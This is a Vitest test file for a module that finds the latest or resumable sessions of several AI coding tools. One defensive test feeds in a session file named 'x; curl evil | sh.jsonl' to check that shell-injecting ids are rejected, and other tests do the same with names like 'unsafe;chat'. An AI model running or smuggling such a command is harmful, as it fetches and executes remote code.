// @vitest-environment node
import { describe, it, expect, vi, beforeEach } from "vitest";

// Mock the fs module the discovery uses for the generic (non-claude) path.
const readdir = vi.fn();
const readFile = vi.fn();
const stat = vi.fn();
vi.mock("node:fs/promises", () => ({
  readdir: (...args: unknown[]) => readdir(...args),
  readFile: (...args: unknown[]) => readFile(...args),
  stat: (...args: unknown[]) => stat(...args),
}));

// Mock the claude streaming parser delegate.
const listSessions = vi.fn();
vi.mock("@/services/claude-session-service", () => ({
  listSessions: (...args: unknown[]) => listSessions(...args),
}));

import {
  discoverLatestSessionId,
  listSessionIds,
  listResumableSessions,
} from "../session-id-discovery";

beforeEach(() => {
  readdir.mockReset();
  readFile.mockReset();
  stat.mockReset();
  listSessions.mockReset();
});

describe("discoverLatestSessionId — generic providers", () => {
  it("returns the newest file stem under CODEX_HOME for codex", async () => {
    readdir.mockResolvedValue(["old.jsonl", "newest.jsonl"]);
    stat.mockImplementation((p: string) =>
      Promise.resolve({ mtimeMs: p.includes("newest") ? 2000 : 1000 }),
    );

    const id = await discoverLatestSessionId("codex", "/proj", { CODEX_HOME: "/fake/codex" });
    expect(id).toBe("newest");
    expect(readdir).toHaveBeenCalledWith("/fake/codex");
  });

  it("strips json/jsonl extensions to recover the bare native id", async () => {
    readdir.mockResolvedValue(["abc-123.json"]);
    stat.mockResolvedValue({ mtimeMs: 5 });
    const id = await discoverLatestSessionId("gemini", "/proj", { GEMINI_HOME: "/g" });
    expect(id).toBe("abc-123");
  });

  it("returns null for antigravity (no resume support)", async () => {
    const id = await discoverLatestSessionId("antigravity", "/proj", {});
    expect(id).toBeNull();
    expect(readdir).not.toHaveBeenCalled();
  });

  it("returns null when the provider dir cannot be read", async () => {
    readdir.mockRejectedValue(new Error("ENOENT"));
    const id = await discoverLatestSessionId("opencode", "/proj", { OPENCODE_HOME: "/missing" });
    expect(id).toBeNull();
  });

  it("rejects a shell-injecting id and relaunches fresh (defense-in-depth)", async () => {
    // A maliciously-named session file would be typed into a tmux send-keys
    // prompt; its stem contains spaces/`;`/`|` → must be skipped, not resumed.
    readdir.mockResolvedValue(["x; curl evil | sh.jsonl"]);
    stat.mockResolvedValue({ mtimeMs: 100 });
    const id = await discoverLatestSessionId("codex", "/proj", { CODEX_HOME: "/c" });
    expect(id).toBeNull();
  });

  it("skips unsafe ids but still returns a newer safe one", async () => {
    readdir.mockResolvedValue(["bad name$.jsonl", "good-id-1.jsonl"]);
    // The unsafe file is newest; the safe one is older. Filtering must drop the
    // unsafe entry and fall through to the safe id rather than returning null.
    stat.mockImplementation((p: string) =>
      Promise.resolve({ mtimeMs: p.includes("bad") ? 200 : 100 }),
    );
    const id = await discoverLatestSessionId("codex", "/proj", { CODEX_HOME: "/c" });
    expect(id).toBe("good-id-1");
  });
});

describe("Cursor project-scoped chat-index discovery", () => {
  it("finds matching conversations across Cursor workspace buckets, newest first", async () => {
    const projectPath = "/Users/dev/my repo/.worktrees/task";
    readdir.mockImplementation((path: string) => {
      if (path === "/cursor-data/chats") {
        return Promise.resolve(["workspace-a", "workspace-b"]);
      }
      if (path === "/cursor-data/chats/workspace-a") {
        return Promise.resolve([
          "old-chat",
          "new-chat",
          "wrong-cwd",
          "empty-chat",
          "unsafe;chat",
        ]);
      }
      if (path === "/cursor-data/chats/workspace-b") {
        return Promise.resolve(["other-workspace-chat"]);
      }
      return Promise.reject(new Error(`unexpected readdir: ${path}`));
    });
    readFile.mockImplementation((path: string) => {
      const metadata = path.includes("new-chat")
        ? { cwd: projectPath, hasConversation: true, updatedAtMs: 2000 }
        : path.includes("old-chat")
          ? { cwd: projectPath, hasConversation: true, updatedAtMs: 1000 }
          : path.includes("other-workspace-chat")
            ? { cwd: projectPath, hasConversation: true, updatedAtMs: 1500 }
            : path.includes("wrong-cwd")
              ? { cwd: "/another/project", hasConversation: true, updatedAtMs: 3000 }
              : { cwd: projectPath, hasConversation: false, updatedAtMs: 4000 };
      return Promise.resolve(JSON.stringify(metadata));
    });

    const list = await listSessionIds(
      "cursor",
      projectPath,
      { CURSOR_DATA_DIR: "/cursor-data" },
      3,
    );

    expect(readdir).toHaveBeenCalledWith("/cursor-data/chats");
    expect(readFile).toHaveBeenCalledWith(
      "/cursor-data/chats/workspace-a/new-chat/meta.json",
      "utf8",
    );
    expect(readFile).not.toHaveBeenCalledWith(
      "/cursor-data/chats/workspace-a/unsafe;chat/meta.json",
      "utf8",
    );
    expect(list.map((entry) => entry.sessionId)).toEqual([
      "new-chat",
      "other-workspace-chat",
      "old-chat",
    ]);
  });

  it("rejects unsafe Cursor chat directory names", async () => {
    readdir.mockImplementation((path: string) =>
      Promise.resolve(path === "/cursor-data/chats" ? ["workspace-a"] : ["bad;chat"]),
    );

    await expect(
      discoverLatestSessionId("cursor", "/project", {
        CURSOR_DATA_DIR: "/cursor-data",
      }),
    ).resolves.toBeNull();
    expect(readFile).not.toHaveBeenCalled();
  });
});

describe("discoverLatestSessionId — claude delegates to listSessions", () => {
  it("uses the streaming parser and returns its newest sessionId", async () => {
    listSessions.mockResolvedValue([
      { sessionId: "claude-uuid-1", lastModified: "2026-06-03T00:00:00.000Z" },
    ]);
    const id = await discoverLatestSessionId("claude", "/proj", {
      CLAUDE_CONFIG_DIR: "/profiles/p1/.config",
    });
    expect(id).toBe("claude-uuid-1");
    expect(listSessions).toHaveBeenCalledWith("/proj", {
      limit: 1,
      profileConfigDir: "/profiles/p1/.config",
    });
  });
});

describe("listSessionIds", () => {
  it("returns newest-first list for generic providers", async () => {
    readdir.mockResolvedValue(["a.jsonl", "b.jsonl", "c.jsonl"]);
    stat.mockImplementation((p: string) =>
      Promise.resolve({ mtimeMs: p.includes("a") ? 30 : p.includes("b") ? 20 : 10 }),
    );
    const list = await listSessionIds("codex", "/proj", { CODEX_HOME: "/c" }, 2);
    expect(list.map((s) => s.sessionId)).toEqual(["a", "b"]);
  });
});

describe("listResumableSessions — picker shape", () => {
  it("preserves Claude's rich previews (firstUserMessage + gitBranch)", async () => {
    listSessions.mockResolvedValue([
      {
        sessionId: "claude-uuid-1",
        lastModified: "2026-06-03T00:00:00.000Z",
        firstUserMessage: "fix the bug",
        gitBranch: "main",
      },
    ]);
    const list = await listResumableSessions("claude", "/proj", {
      CLAUDE_CONFIG_DIR: "/profiles/p1/.config",
    });
    expect(list[0]).toMatchObject({
      sessionId: "claude-uuid-1",
      firstUserMessage: "fix the bug",
      gitBranch: "main",
    });
    expect(listSessions).toHaveBeenCalledWith("/proj", {
      limit: 20,
      profileConfigDir: "/profiles/p1/.config",
    });
  });

  it("returns id + timestamp (no preview) for disk-discovery providers", async () => {
    readdir.mockResolvedValue(["cx-1.jsonl"]);
    stat.mockResolvedValue({ mtimeMs: 1000 });
    const list = await listResumableSessions("codex", "/proj", { CODEX_HOME: "/c" });
    expect(list).toHaveLength(1);
    expect(list[0].sessionId).toBe("cx-1");
    expect(list[0].firstUserMessage).toBeUndefined();
    expect(list[0].gitBranch).toBeUndefined();
  });

  it("empty-states (returns []) when the provider dir is unreadable", async () => {
    readdir.mockRejectedValue(new Error("ENOENT"));
    const list = await listResumableSessions("gemini", "/proj", { GEMINI_HOME: "/missing" });
    expect(list).toEqual([]);
  });

  it("returns [] for a non-resumable provider (antigravity)", async () => {
    const list = await listResumableSessions("antigravity", "/proj", {});
    expect(list).toEqual([]);
    expect(readdir).not.toHaveBeenCalled();
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// [remote-dev-n4x4.6] Claude sessions run with CLAUDE_CONFIG_DIR UNSET, so
// their transcripts land in the user's real ~/.claude/projects. Discovery must
// therefore work from an env that does NOT carry the variable — the case that
// is now the norm rather than the exception.
// ─────────────────────────────────────────────────────────────────────────────

describe("claude discovery with CLAUDE_CONFIG_DIR unset (the n4x4.6 default)", () => {
  it("passes profileConfigDir: undefined so listSessions falls back to ~/.claude", async () => {
    listSessions.mockResolvedValue([
      { sessionId: "claude-uuid-shared", lastModified: "2026-07-28T00:00:00.000Z" },
    ]);

    const id = await discoverLatestSessionId("claude", "/proj", {});

    expect(id).toBe("claude-uuid-shared");
    // undefined — NOT "" and NOT an explicit $HOME/.claude. claude-session-service
    // maps undefined to homedir()/.claude, which is where Claude actually wrote.
    expect(listSessions).toHaveBeenCalledWith("/proj", {
      limit: 1,
      profileConfigDir: undefined,
    });
  });

  it("lists resumable sessions from the shared config dir", async () => {
    listSessions.mockResolvedValue([
      {
        sessionId: "claude-uuid-shared",
        lastModified: "2026-07-28T00:00:00.000Z",
        firstUserMessage: "ship the thing",
        gitBranch: "master",
      },
    ]);

    const list = await listResumableSessions("claude", "/proj", {});

    expect(list[0]).toMatchObject({
      sessionId: "claude-uuid-shared",
      firstUserMessage: "ship the thing",
    });
    expect(listSessions).toHaveBeenCalledWith("/proj", {
      limit: 20,
      profileConfigDir: undefined,
    });
  });

  it("still honours an explicit CLAUDE_CONFIG_DIR (legacy sessions, other tools)", async () => {
    // A session created BEFORE n4x4.6 has the variable in its resume binding;
    // its transcripts really are under the profile dir, so discovery must keep
    // using it rather than silently reading the shared dir.
    listSessions.mockResolvedValue([
      { sessionId: "legacy-uuid", lastModified: "2026-01-01T00:00:00.000Z" },
    ]);

    await discoverLatestSessionId("claude", "/proj", {
      CLAUDE_CONFIG_DIR: "/profiles/p1",
    });

    expect(listSessions).toHaveBeenCalledWith("/proj", {
      limit: 1,
      profileConfigDir: "/profiles/p1",
    });
  });
});
